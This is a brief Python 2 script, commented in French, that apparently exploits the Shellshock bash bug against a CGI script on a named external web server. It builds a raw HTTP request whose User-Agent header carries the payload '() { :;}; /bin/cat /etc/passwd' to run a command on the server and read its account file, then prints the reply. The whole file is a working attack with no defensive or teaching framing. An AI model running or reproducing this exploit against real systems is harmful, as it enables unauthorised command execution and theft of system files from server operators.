#!/usr/bin/python
import sys, urllib2 
import socket,subprocess # on importe le module, TRES IMPORTANT !
 
#creation de la socket puis connexion

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("www.fornax.sk",80))

 
# preparation de la requete
Request = "GET /cgi-bin/www/fortunes.sh HTTP/1.1\r\n"

Request+= "Host: www.fornax.sk\r\n"
Request+= "User-Agent: () { :;}; /bin/cat /etc/passwd\r\n"
Request+= "Connection: Close\r\n\r\n"

 
# envoi puis reception de la reponse
s.send(Request)
data = s.recv(1024)
print "$" + data
